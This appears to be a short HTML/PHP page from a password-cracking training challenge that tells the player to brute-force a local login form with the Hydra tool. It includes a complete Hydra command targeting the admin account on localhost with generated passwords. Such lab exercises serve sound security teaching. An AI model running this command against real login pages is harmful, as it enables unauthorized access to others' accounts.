<h2>CHALLENGE 1 (MEDIUM):</h2>
<h3>Brute-force Attack - Cracking the password.</h3>

In this challenge you must crack the password of the login form using a generated brute force attack on a Linux system. The brute-force attack tool you must use is called "Hydra".

A link to the tool with documentation will be available on the challenge website.
https://github.com/vanhauser-thc/thc-hydra

In the HTML code you can find the command to start the brute-force attack.

<codehydra -V -f -l admin -x 4:6:a -s 8080 localhost http-post-form "/challenges/dontbelazy/:username=admin&password=^PASS^&submit=Login:S=You found the correct:H=Cookie: PHPSESSID=<?= $_COOKIE['PHPSESSID'] ?></code>
